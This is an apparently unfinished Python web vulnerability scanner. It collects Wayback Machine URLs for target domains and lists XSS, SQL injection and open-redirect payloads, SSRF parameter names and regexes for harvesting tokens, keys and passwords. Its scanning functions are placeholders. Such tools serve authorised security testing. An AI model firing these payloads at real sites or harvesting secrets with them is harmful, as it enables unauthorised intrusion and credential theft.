import requests
import re
import argparse
from urllib.parse import urlparse, urlencode, urljoin, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

# Payloads & patterns (shortened for brevity)
SSRF_PARAMS = ["url", "uri", "path", "continue", "data", "dest", "redirect", "next", "v", "image", "file", "link", "src", "load", "page", "callback", "return", "site", "open"]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\u003cscript\u003ealert(1)\u003c/script\u003e"
]
REDIRECT_PAYLOADS = [
    "https://google.com",
    "//google.com",
    "\\google.com",
    "/\\google.com",
    "%2f%2fgoogle.com"
]
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin' --",
    "' UNION SELECT null, version() --",
    "' AND SLEEP(5) --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "') OR ('1'='1--",
    "admin' #",
    "admin'/*"
]

SENSITIVE_PATTERNS = {
    "JWT": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
    "Slack Token": r"xox[baprs]-[0-9a-zA-Z]{10,48}",
    "Private Key": r"-----BEGIN (RSA|DSA|EC|PGP|OPENSSH) PRIVATE KEY-----",
    "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    "Password": r"(?i)(password|pwd|pass)[\"'=:\s]+([a-zA-Z0-9@#%$!^&*]{6,})"
}

def get_wayback_urls(domain):
    urls = set()
    try:
        r = requests.get(f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey", timeout=15)
        if r.status_code == 200:
            data = r.json()
            for entry in data[1:]:
                urls.add(entry[0])
    except Exception as e:
        print(f"[!] Wayback fetch error for {domain}: {e}")
    return list(urls)

# ... Include all other scanning functions here (scan_ssrf, scan_xss, scan_redirect, scan_sqli, scan_sensitive_info)...

def scan_url(url, blind, results):
    # Scanning logic calls each scanning function, append results to results dict/lists
    pass  # Placeholder for your actual scanning functions (copy from your latest script)

def main():
    parser = argparse.ArgumentParser(description="Vulnerability Scanner")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--list", help="File with list of domains")
    group.add_argument("domain", nargs="?", help="Single domain to scan")
    parser.add_argument("--blind", required=True, help="Blind SSRF URL")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads (default: 20)")

    args = parser.parse_args()

    if args.list:
        with open(args.list) as f:
            domains = [line.strip() for line in f if line.strip()]
    elif args.domain:
        domains = [args.domain]
    else:
        print("Error: You must specify a domain or a --list file.")
        return

    all_urls = set()
    print("[*] Gathering URLs from wayback...")
    for domain in domains:
        all_urls.add(domain)
        all_urls.update(get_wayback_urls(domain))

    results = {
        "ssrf": [],
        "xss": [],
        "redirect": [],
        "sqli": [],
        "sensitive": []
    }

    print(f"[*] Starting scan on {len(all_urls)} URLs with {args.threads} threads...")
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        list(tqdm(executor.map(lambda u: scan_url(u, args.blind, results), all_urls), total=len(all_urls)))

    # After scanning print nicely formatted results
    if results["sqli"]:
        print("\n\033[1;31mSQL Injection Found:\033[0m")
        for entry in results["sqli"]:
            print(f"  - {entry}")
    if results["xss"]:
        print("\n\033[1;33mXSS Found:\033[0m")
        for entry in results["xss"]:
            print(f"  - {entry}")
    if results["redirect"]:
        print("\n\033[1;34mOpen Redirect Found:\033[0m")
        for entry in results["redirect"]:
            print(f"  - {entry}")
    if results["ssrf"]:
        print("\n\033[1;36mSSRF Found:\033[0m")
        for entry in results["ssrf"]:
            print(f"  - {entry}")
    if results["sensitive"]:
        print("\n\033[1;35mSensitive Information Found:\033[0m")
        for kind, url, match in results["sensitive"]:
            print(f"  - [{kind}] in {url} => {match}")

if __name__ == "__main__":
    main()
